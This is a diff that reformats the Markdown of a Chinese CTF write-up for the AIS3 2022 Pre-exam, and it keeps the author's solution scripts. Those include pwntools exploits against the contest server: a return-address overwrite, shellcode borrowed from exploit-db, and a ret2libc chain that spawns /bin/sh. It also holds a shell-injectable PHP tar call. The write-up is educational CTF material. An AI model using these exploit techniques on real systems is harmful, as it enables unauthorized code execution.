@@ -1,23 +1,24 @@
 ---
+classes: wide
 categories: []
 tags:
-- ais3
-- ctf
-- writeup
+  - ais3
+  - ctf
+  - writeup
 toc: true
 toc_sticky: true
 title: AIS3 2022 Pre-exam Writeup
-
 ---
+
 從 226 名、49 名，一直到今年的第 2 名，著實感受到自己的進步，雖然也有一部分是因為跟我差不多時期的人可能都去出題了，所以競爭沒有往年激烈。不過還是很高興可以看見從上大學到現在有一點一點地在進步，期許畢業前可以在 EOF 上也有更好的 solo 成績。
 
 不得不說 AIS3 pre-exam 每年都有用心在出題目，相較 CTFTime 上常有些不明所以的 CTF，pre-exam 打起來都是很開心的。
 
 ## Rank
 
-* Team: `Ice1187`
-* Ranking: 2nd
-* Writeup Repo: [Ice1187/AIS3-2022-Pre-exam-Writeup](https://github.com/Ice1187/AIS3-2022-Pre-exam-Writeup "Ice1187/AIS3-2022-Pre-exam-Writeup")
+- Team: `Ice1187`
+- Ranking: 2nd
+- Writeup Repo: [Ice1187/AIS3-2022-Pre-exam-Writeup](https://github.com/Ice1187/AIS3-2022-Pre-exam-Writeup "Ice1187/AIS3-2022-Pre-exam-Writeup")
 
 <img width="800" alt="ais3-pre-exam-scoreboard" src="https://user-images.githubusercontent.com/38059464/175545378-5b5f373e-7da8-4c96-b7d7-463e5a16caf5.png" >
 
@@ -50,12 +51,12 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
 
    ```python
    from z3 import *
-   
+
    a = [BitVec(f'a[{i}]', 8) for i in range(46)]
    solver = Solver()
-   
+
    solver.add(a[0] == ord('A'))
-   
+
    # AIS3
    offset = 1
    solver.add(a[14+offset] == ord('A'))
@@ -64,7 +65,7 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
    for i in range(len(array)):
        solver.add((a[i+offset] ^ ord('W')) == array[i])
    print(solver.check())
-   
+
    # more checks...
    ```
 
@@ -79,15 +80,16 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
    ```bash
    $ npm install @wenyan/core
    $ npm install js-beautify
-   
+
    $ ./node_modules/.bin/wenyan --dir ./chal/藏書樓/ ./chal/殼.wy   # execute
    輸入「助」以獲得更多幫助
    >
-   
+
    $ cd ./chal
    $ npx --package=@wenyan/cli wenyan -c -o ../decomp.js -r --roman pinyin 殼.wy   # convert to JavaScript
    $ node_modules/.bin/js-beautify ./decomp.js > decomp_beauty.js                  # beautify JavaScript
    ```
+
 3. 簡單看一下 JavaScript code 可以發現輸入要以 `蛵煿` 開頭，然後輸入經過一些運算之後要符合 `密旗` (`MI4QI2`) 這個變數的內容。
    <img width="592" alt="wenyan-decomp" src="https://user-images.githubusercontent.com/38059464/176666873-ab912dba-1218-44e0-b0bb-d01f41b87c56.png">
 4. 後來實在是懶得看又醜又長的 JavaScript，觀察輸入之後發現每 3 個輸入字元決定 2 個輸出字元，因此把 mapping 建出來，就能直接從答案反推輸入了。所有組合大概有 1000000 組，最後花了 6\~8 個小時建出大概 8 成的 mapping，然後反推輸入得到 flag。
@@ -105,9 +107,9 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
    $ cat Dockerfile
    FROM ubuntu:22.04
    RUN apt-get update && apt-get upgrade -y
-   
+
    COPY ./flag_checker /
-   
+
    $ sudo docker build -t flag-checker-demo .
    $ sudo docker run -itd flag-checker-demo:latest
    eccce3f0aa7eaf6dcd8548afc5a57ff5a289fbc4ff99611b4dbeadeafc41d1a8
@@ -116,6 +118,7 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
    a
    Bad
    ```
+
 3. 從 IDA 得知輸入開頭須為 `AIS3{`。
    <img width="533" alt="flag-checker-ais3-start" src="https://user-images.githubusercontent.com/38059464/176687851-9211a505-7b70-4ca4-a28c-1308ab8e265f.png">
 4. 用 `gdb` 追進去，看到 `Thread dubugging` 因此猜測可能有 call `fork` 或 `execve` 之類的 system call。用 `catch syscall` 在遇到 syscall 時中斷，發現其透過 `execve` 執行 `python`。
@@ -134,7 +137,7 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
    Catchpoint 1 (any syscall)
    pwndbg> c
    Continuing.
-   
+
    Catchpoint 1 (call to syscall execve), 0x00005582a84281d0 in ?? ()
    pwndbg> ni
    ────────────────────────[ STACK ]────────────────────────
@@ -161,7 +164,7 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
 
    ```python
    from Crypto.Util.number import inverse
-   
+
    # RSA-like solution
    n = 542732316977950510497270190501021791757395568139126739977487019184541033966691938940926649138411381198426866278991473
    r = n-1    # n is a prime, so r = phi(n) = n-1
@@ -171,7 +174,7 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
    m = pow(c, d, n)
    flag = m.to_bytes(64, 'big').strip(b'\x00').decode()
    flag = 'AIS3{' + flag
-   
+
    print(flag)
    ```
 
@@ -210,11 +213,11 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
    flags = ['AIS3{', 'good', 'luck', 'finding', 'the', 'flags', 'value', 'using', 'strings',
             'command', 'guess', 'which', 'substring', 'is', 'our', 'actual', 'answer', 'lmaoo', '}']
    indexes = [0, 0x4, 0x10, 0xd, 0xa, 0x4, 0x8, 0x7, 0x1, 0x2, 0x12]
-   
+
    flag = []
    for i in indexes:
        flag.append(flags[i])
-   
+
    print('_'.join(flag))
    ```
 
@@ -238,6 +241,7 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
    777                     [Status: 200, Size: 1744, Words: 295, Lines: 42]
    999                     [Status: 200, Size: 1744, Words: 295, Lines: 42]
    ```
+
 3. 需要成為 `bear poker`，因此將 Cookie 的 `human` 設成 `bear poker`，再 poke 一次就拿到 flag。
 
    ```bash
@@ -274,6 +278,7 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
    $destination = "./files/$path";
    passthru("tar czf '$destination' --transform='s|$source|$filename|' --directory='/tmp' '/$source'", $return);
    ```
+
 3. 上傳檔案即可讀到 flag。
 
    ```bash
@@ -306,7 +311,7 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
       public:
        char *str;
        size_t len;
-   
+
        String(const char *s) {
            len = strlen(s);
            str = new char[len + 1];
@@ -314,7 +319,7 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
        }
        ~String() { delete[] str; }
    };
-   
+
    void print(String s) {
        printf("Length: %zu\n", s.len);
        printf("Content: ");
@@ -322,6 +327,7 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
        printf("\n");
    }
    ```
+
 2. 建立 string 之後 print 兩次得到 flag。
 
    ```bash
@@ -363,15 +369,15 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
 
    ```python
    from pwn import *
-   
+
    p = remote('127.0.0.1', 12347)
    p = remote('chals1.ais3.org', 12347)
-   
+
    flag_adr = 0x401216
-   
+
    payload = b'A'*24
    payload += flag_adr.to_bytes(8, 'little')
-   
+
    p.recv()
    p.sendline(payload)
    print(p.recv())
@@ -386,13 +392,13 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
 
    ```python
    from pwn import *
-   
+
    p = remote('127.0.0.1', 15566)
    p = remote('chals1.ais3.org', 15566)
-   
+
    # ref: https://www.exploit-db.com/exploits/47048
    shellcode = b"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"
-   
+
    p.recv()
    p.send(b'AAAA')
    p.recv()
@@ -439,6 +445,7 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
       0x401d5a    mov    rdx,0x1000
       0x401d61    jmp    r8
    ```
+
 3. `write` 也有同樣的操作。
 
    ```python
@@ -469,24 +476,25 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
       0x401e54    mov    rdx,0x100
       0x401e5b    jmp    r8
    ```
+
 4. 整理一下可以發現當 `read` 2 次、 `write` 3 次時可以 read 0x100 bytes，而當 `read` 3 次、 `write` 8 次時可以寫 0x1000 bytes。各個 memory 紀錄的數值如下：
-   * `[0x404f00]` counts how many time read been called
-   * `[0x404f08]` counts how many time write been called
-   * `[0x404f10]` original read
-   * `[0x404f18]` original write
+   - `[0x404f00]` counts how many time read been called
+   - `[0x404f08]` counts how many time write been called
+   - `[0x404f10]` original read
+   - `[0x404f18]` original write
 5. 因此我們可以用 `read` 0x100 bytes 來 leak glibc (libc version 可從提供的 container 得知)，然後用 `write` 0x1000 bytes 做 ret2libc。
 
    ```python
    from pwn import *
-   
+
    #p = remote('127.0.0.1', 12348)
    p = remote('chals1.ais3.org', 12348)
    debug = False
-   
+
    #p = process('./magic/share/magic')
    #p = gdb.debug('./magic/share/magic', gdbscript='continue')
    #debug = True
-   
+
    def read():
        print('[*] Reading')
        print(p.recvuntil(b'> '))
@@ -494,7 +502,7 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
        data = p.recvuntil(b'read')[:-4]
        print('[*] Read', data)
        return data
-   
+
    def write(data=b'A'):
        print('[*] Writing')
        print(p.recvuntil(b'> '))
@@ -502,7 +510,7 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
        p.send(data)
        print('[*] Written', data)
        return
-   
+
    def super_read():
        write()
        write()
@@ -510,16 +518,16 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
        read()
        data = read()
        return data
-   
+
    def super_write(payload):
        for _ in range(5):
            read()
        write(payload)
-   
+
    # leak libc: version libc6_2.31-0ubuntu9.2_amd64
    leak = super_read()
    print('leak:', leak)
-   
+
    if debug:
        libc = int.from_bytes(leak[22:22+8], 'little') - 0x240b3
    else:
@@ -530,7 +538,7 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
    bin_sh = libc + 0x1b45bd
    pop_rdi = 0x401313
    ret = 0x40101a
-   
+
    payload = padding
    payload += p64(pop_rdi)
    payload += p64(bin_sh)
@@ -540,7 +548,7 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
    super_write(payload)
    p.sendline(b'c')
    p.interactive()
-   
+
    ```
 
 **Flag:** `AIS3{ma4a4a4aGiCian}`
@@ -560,28 +568,28 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
 
    ```python
    import string
-   
+
    charset = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
    enc_charset = [None for _ in range(len(charset))]
-   
+
    print(charset)
-   
+
    txt = open('./cipher.py', 'r').read()
    enc = open('./cipher.py.enc', 'r').read()
-   
+
    for i in range(len(txt)):
        c = txt[i]
        enc_c = enc[i]
        if c in charset:
            idx = charset.index(c)
            enc_charset[idx] = enc_c
-   
-   
+
+
    charset = ''.join(charset)
    enc_charset = ''.join([x if x is not None else '@' for x in enc_charset])
-   
+
    T = str.maketrans(enc_charset, charset)
-   
+
    with open('./flag.txt.enc', 'r') as f:
        enc_flag = f.read()
    print(enc_flag.translate(T))
@@ -595,42 +603,43 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
 
    ```python
    from secrets import randbelow
-   
+
    M = 2**1024
-   
+
    def f(x):
        # this is a *fast* function
        return (
            4 * x**4 + 8 * x**8 + 7 * x**7 + 6 * x**6 + 3 * x**3 + 0x48763
        ) % M
-   
+
    def encrypt(pt, key):
        ct = []
        for c in pt:
            ct.append(c ^ (key & 0xFF))
            key = f(key)
        return bytes(ct)
-   
+
    if __name__ == "__main__":
        key = randbelow(M)
        ct = encrypt(open("flag.txt", "rb").read().strip(), key)
        print(ct.hex())
    ```
+
 2. 寫個 script 爆搜一下，馬上就能算出 flag。
 
    ```python
    M = 2**1024
-   
+
    with open('./output.txt', 'r') as f:
        enc_flag = f.read().strip()
    enc_flag = int(enc_flag, 16).to_bytes(64, 'big').strip(b'\x00')
-   
+
    def f(x):
        # this is a *fast* function
        return (
            4 * x**4 + 8 * x**8 + 7 * x**7 + 6 * x**6 + 3 * x**3 + 0x48763
        ) % M
-   
+
    def decrypt(key):
        flag = ''
        for e in enc_flag:
@@ -639,7 +648,7 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
        if 'AIS3' in flag:
            print(flag)
            exit(0)
-   
+
    for k in range(2**1024):
        tmp = ''
        tmp_k = k
@@ -669,7 +678,7 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
    a = a[8:-6]
    a = a.replace('&amp;', '&')
    a = a.split('&')
-   
+
    # hardcore...
    flag = ''
    for i in a:
@@ -688,9 +697,9 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
 
    ```python
    from PIL import Image
-   
+
    # ref: https://stackoverflow.com/questions/53364769/get-frames-per-second-of-a-gif-in-python
-   
+
    im = Image.open('./gift_in_the_dream_updated.gif')
    try:
        while 1:
@@ -706,11 +715,11 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
 
    ```python
    from PIL import Image
-   
+
    # ref: https://stackoverflow.com/questions/53364769/get-frames-per-second-of-a-gif-in-python
-   
+
    im = Image.open('./gift_in_the_dream_updated.gif')
-   
+
    flag = ''
    try:
        while 1:
@@ -718,7 +727,7 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
            im.seek(im.tell()+1)
    except EOFError:
        pass
-   
+
    print(flag)
    ```
 
@@ -732,16 +741,17 @@ Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`
 
    ```python
    import scapy.all as scapy
-   
+
    packets = scapy.rdpcap('./knock.pcapng')
-   
+
    knock_packets = packets[scapy.UDP][12:]
-   
+
    flag = ''
    for p in knock_packets:
        flag += chr(p.dport - 12000)
-   
+
    print(flag)
    ```
 
 **Flag:** `AIS3{kn0ckKNOCKknock}`
+
